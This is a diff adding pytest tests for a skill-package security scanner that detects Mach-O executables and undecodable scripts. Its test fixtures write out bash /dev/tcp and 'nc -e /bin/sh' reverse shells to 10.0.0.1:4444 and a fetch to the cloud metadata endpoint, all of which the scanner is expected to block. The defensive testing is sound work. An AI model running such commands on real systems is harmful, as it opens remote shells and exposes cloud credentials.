@@ -7,6 +7,7 @@ from types import SimpleNamespace
 
 import pytest
 
+from deerflow.skills.package_files import is_executable_binary_prefix
 from deerflow.skills.security_scanner import scan_skill_content
 from deerflow.skills.skillscan import StaticScanBlockedError, enforce_static_scan, scan_archive_preflight, scan_skill_dir
 
@@ -162,6 +163,30 @@ def test_archive_preflight_reports_package_findings(tmp_path: Path) -> None:
     assert result["blocked"] is True
 
 
+@pytest.mark.parametrize(
+    "magic",
+    [b"\xce\xfa\xed\xfe", b"\xbe\xba\xfe\xca", b"\xca\xfe\xba\xbf"],
+    ids=["mach-o-32-le", "mach-o-fat-le", "mach-o-fat64-be"],
+)
+def test_executable_magic_matches_installer_guard(tmp_path: Path, magic: bytes) -> None:
+    skill_dir = tmp_path / "demo-skill"
+    _write_skill(skill_dir)
+    (skill_dir / "tool").write_bytes(magic + b"\x00\x00\x00\x07payload")
+
+    finding = _finding_by_rule(scan_skill_dir(skill_dir)["findings"], "package-executable-binary")
+
+    assert (finding["file"], finding["evidence"]) == ("tool", "Mach-O")
+    assert is_executable_binary_prefix(magic)
+
+
+def test_truncated_mach_o_magic_is_not_executable(tmp_path: Path) -> None:
+    skill_dir = tmp_path / "demo-skill"
+    _write_skill(skill_dir)
+    (skill_dir / "data.bin").write_bytes(b"\xfe\xed\xfa\x00\x00\x00\x00\x00")
+
+    assert not [f for f in scan_skill_dir(skill_dir)["findings"] if f["rule_id"] == "package-executable-binary"]
+
+
 def test_nested_zip_with_executable_member_escalates_to_critical(tmp_path: Path) -> None:
     archive = tmp_path / "demo-skill.skill"
     with zipfile.ZipFile(archive, "w") as zf:
@@ -241,6 +266,30 @@ def test_shell_strong_reverse_shell_still_blocks(tmp_path: Path) -> None:
     result = scan_skill_dir(skill_dir)
 
     assert _finding_by_rule(result["findings"], "shell-reverse-shell")["severity"] == "CRITICAL"
+    assert result["blocked"] is True
+
+
+@pytest.mark.parametrize(
+    ("rel_path", "script_bytes", "rule_id", "evidence"),
+    [
+        ("scripts/run.sh", b"#!/bin/bash\n# caf\xe9\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", "shell-reverse-shell", "invalid UTF-8"),
+        ("scripts/run.py", b'# -*- coding: latin-1 -*-\n# caf\xe9\nimport os\nos.system("id")\n', "python-shell-exec", "invalid UTF-8"),
+        ("bin/run", b"#!/bin/sh\n# \x00\nnc -e /bin/sh 10.0.0.1 4444\n", "shell-reverse-shell", "NUL byte"),
+        ("lib/fetch.js", b'// caf\xe9\nfetch("http://169.254.169.254/latest/meta-data/")\n', "network-cloud-metadata", "invalid UTF-8"),
+    ],
+)
+def test_undecodable_script_is_flagged_and_analyzed(tmp_path: Path, rel_path: str, script_bytes: bytes, rule_id: str, evidence: str) -> None:
+    skill_dir = tmp_path / "demo-skill"
+    _write_skill(skill_dir)
+    script = skill_dir / rel_path
+    script.parent.mkdir(parents=True)
+    script.write_bytes(script_bytes)
+
+    result = scan_skill_dir(skill_dir)
+
+    undecodable = _finding_by_rule(result["findings"], "package-undecodable-script")
+    assert (undecodable["file"], undecodable["severity"], undecodable["evidence"]) == (rel_path, "HIGH", evidence)
+    assert _finding_by_rule(result["findings"], rule_id)["severity"] == "CRITICAL"
     assert result["blocked"] is True
 
 
